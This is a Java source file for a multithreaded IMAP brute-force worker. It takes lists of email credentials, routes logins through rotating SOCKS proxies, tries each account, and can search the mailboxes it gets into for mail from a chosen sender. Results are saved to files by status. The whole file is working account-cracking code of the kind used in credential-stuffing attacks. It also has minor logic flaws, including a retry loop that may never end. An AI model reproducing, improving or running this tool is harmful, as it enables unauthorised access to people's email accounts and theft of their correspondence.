package org.bsoftware.parcel.domain.runnables;

import com.chilkatsoft.CkImap;
import com.chilkatsoft.CkMailboxes;
import com.chilkatsoft.CkMessageSet;
import com.chilkatsoft.CkString;
import lombok.RequiredArgsConstructor;
import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
import org.bsoftware.parcel.domain.components.DataContainer;
import org.bsoftware.parcel.domain.model.Connection;
import org.bsoftware.parcel.domain.model.DataType;
import org.bsoftware.parcel.domain.model.LogLevel;
import org.bsoftware.parcel.domain.model.Proxy;
import org.bsoftware.parcel.domain.model.Source;
import org.bsoftware.parcel.utilities.ConnectionUtility;
import org.bsoftware.parcel.utilities.FileSystemUtility;

import java.io.IOException;
import java.util.Optional;

/**
 * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
 *
 * @author Rudolf Barbu
 * @version 1.0.8
 */
@RequiredArgsConstructor
public class BruteForceRunnable implements Runnable
{
    /**
     * Defines connection timeout
     */
    private static final byte CONNECTION_TIMEOUT = 5;

    /**
     * Defines Socks version
     */
    private static final byte SOCKS_VERSION = 5;

    /**
     * Defines error pattern, that indicate connection impossibility
     */
    private static final String NO_CONNECTION_TO_IMAP_SERVER_ERROR = "<error>No connection to IMAP server.</error>";

    /**
     * Defines maximum connection attempts, if connection is refused
     */
    private static final int MAXIMUM_CONNECTION_ATTEMPTS = 5;

    /**
     * Defines, if search algorithm is in use
     */
    private static final Boolean SEARCH_LETTERS = Boolean.FALSE;

    /**
     * Defines search query
     */
    private static final String SEARCH_QUERY = "";

    /**
     * Indicator for proxy usage
     */
    private final boolean useProxies;

    /**
     * Callback interface, which is used to deliver messages to service
     */
    private final BruteForceCallback bruteForceCallback;

    /**
     * Main method of brute-force algorithm
     */
    @Override
    public void run()
    {
        final CkImap ckImap = new CkImap();

        if (useProxies)
        {
            ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
            ckImap.put_SocksVersion(SOCKS_VERSION);
        }

        try
        {
            Source source;
            while (((source = DataContainer.getNextSource()) != null) && !Thread.currentThread().isInterrupted())
            {
                final Connection connection = ConnectionUtility.getConnection(source.getCredential());

                ckImap.put_Port(connection.getPort());
                ckImap.put_Ssl(connection.isSsl());
                ckImap.put_StartTls(connection.isTls());
                bruteForceCallback.handleDecrementCounter(DataType.SOURCE);

                final Status connectionStatus = useProxies ? retrieveProxy(ckImap, connection.getHost()) : connectToServer(ckImap, connection.getHost());

                if (useProxies && (connectionStatus == Status.BAD))
                {
                    break;
                }

                FileSystemUtility.saveSourceToFile(executeBruteForceActions(connectionStatus, ckImap, source).name().toLowerCase(), source);
                ckImap.Disconnect();
            }
        }
        catch (final IOException | InterruptedException exception)
        {
            bruteForceCallback.handleBruteForceMessage(LogLevel.ERROR, String.format("Exception occurred, message: %s", exception.getMessage()));

            if (exception instanceof InterruptedException)
            {
                Thread.currentThread().interrupt();
            }
        }
        finally
        {
            try
            {
                bruteForceCallback.handleThreadInterruption();
            }
            catch (IOException ioException)
            {
                bruteForceCallback.handleBruteForceMessage(LogLevel.ERROR, String.format("I/O exception occurred, message: %s", ioException.getMessage()));
            }
        }
    }

    /**
     * Gets new proxy until they available
     *
     * @param ckImap IMAP to probe connection
     * @param host particular IMAP server to connect
     * @return Status.GOOD, retrieved a good proxy
     */
    private Status retrieveProxy(final CkImap ckImap, final String host) throws InterruptedException
    {
        final CkString currentProxyHostname = new CkString();

        ckImap.get_SocksHostname(currentProxyHostname);
        if (!currentProxyHostname.getString().isEmpty())
        {
            final Status connectionStatus = connectToServer(ckImap, host);

            if (connectToServer(ckImap, host) != Status.BAD)
            {
                return connectionStatus;
            }
        }

        Proxy proxy;
        while (((proxy = DataContainer.getNextProxy()) != null) && !Thread.currentThread().isInterrupted())
        {
            ckImap.put_SocksHostname(proxy.getIpAddress());
            ckImap.put_SocksPort(proxy.getPort());
            bruteForceCallback.handleDecrementCounter(DataType.PROXY);

            final Status connectionStatus = connectToServer(ckImap, host);

            if (connectionStatus != Status.BAD)
            {
                return connectionStatus;
            }
        }

        return Status.BAD;
    }

    /**
     * Tries to connect to IMAP server
     *
     * @param ckImap IMAP to probe connection
     * @param host particular IMAP server to connect
     * @return Status.GOOD, if successfully connected
     */
    @SuppressWarnings("BusyWait")
    private Status connectToServer(final CkImap ckImap, final String host) throws InterruptedException
    {
        if (!ckImap.Connect(host))
        {
            if (ckImap.lastErrorXml().contains(NO_CONNECTION_TO_IMAP_SERVER_ERROR))
            {
                return Status.ERROR;
            }
            else if (!useProxies)
            {
                for (int index = 0; (!Thread.currentThread().isInterrupted() || (index < MAXIMUM_CONNECTION_ATTEMPTS)); index++)
                {
                    Thread.sleep(10_000);

                    if (ckImap.Connect(host))
                    {
                        return Status.GOOD;
                    }
                }

                return Status.ERROR;
            }

            return Status.BAD;
        }

        return Status.GOOD;
    }

    /**
     * Executing brute-force actions, such as log into account and search for letters
     *
     * @param ckImap IMAP to execute actions
     * @param source source object, which is supplied to perform actions
     */
    private Status executeBruteForceActions(final Status connectionStatus, final CkImap ckImap, final Source source)
    {
        if (connectionStatus == Status.ERROR)
        {
            return connectionStatus;
        }
        else if (!ckImap.Login(source.getCredential(), source.getPassword()))
        {
            return Status.BAD;
        }

        if (Boolean.TRUE.equals(SEARCH_LETTERS))
        {
            final CkMailboxes ckMailboxes = ckImap.ListMailboxes("", "*");
            for (int index = 0; index < ckMailboxes.get_Count(); index++)
            {
                ckImap.SelectMailbox(ckMailboxes.getName(index));

                final Optional<CkMessageSet> ckMessageSetOptional = Optional.ofNullable(ckImap.Search(String.format("FROM %s", SEARCH_QUERY), Boolean.TRUE));
                if (ckMessageSetOptional.isPresent() && (ckMessageSetOptional.get().get_Count() > 0))
                {
                    return Status.FOUND;
                }
            }
        }

        return Status.GOOD;
    }

    /**
     * Enum with all possible statuses
     */
    private enum Status
    {
        ERROR, BAD, GOOD, FOUND
    }
}